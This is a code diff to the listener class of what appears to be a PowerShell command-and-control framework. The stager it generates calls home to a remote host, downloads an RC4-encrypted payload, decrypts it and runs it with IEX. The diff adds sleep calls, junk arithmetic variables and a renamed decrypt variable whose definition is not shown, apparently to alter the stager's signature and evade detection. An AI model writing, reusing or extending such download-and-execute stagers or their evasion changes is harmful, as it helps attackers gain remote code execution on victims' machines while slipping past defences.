@@ -264,6 +264,7 @@ class Listener:
             if safeChecks.lower() == "true":
                 stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"
 
+            stager += "sleep(3);"
             
             if userAgent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
@@ -277,6 +278,7 @@ class Listener:
                 f"$hom={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
             )
             stager += "$wc=New-Object System.Net.WebClient;"
+            stager += "$f1=1 + 2 * 3;"
             if userAgent.lower() != "none":
                 stager += "$wc.Headers.Add('User-Agent',$aua);"
 
@@ -322,7 +324,7 @@ class Listener:
 
             # code to turn the key string into a byte array
             stager += f"$Kk=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
-
+            stager += f"$f2=$f1*4;"
             # this is the minimized RC4 stager code from rc4.ps1
             stager += listener_util.powershell_rc4()
 
@@ -353,10 +355,12 @@ class Listener:
             # add the RC4 packet to a cookie
             stager += f'$wc.Headers.Add("Cookie","{ cookie }={ b64RoutingPacket.decode("UTF-8") }");'
             stager += "$mdata=$wc.DownloadData($hom+$t);"
+            stager += "sleep(1);"
+            stager += "$ndata = $mdata;"
             stager += "$miv=$mdata[0..3];$mdata=$mdata[4..$mdata.length];"
 
             # decode everything and kick it over to IEX to kick off execution
-            stager += "-join[Char[]](& $R $mdata ($mIV+$Kk))| IEX"
+            stager += "-join[Char[]](& $M $ndata ($mIV+$Kk))| IEX"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
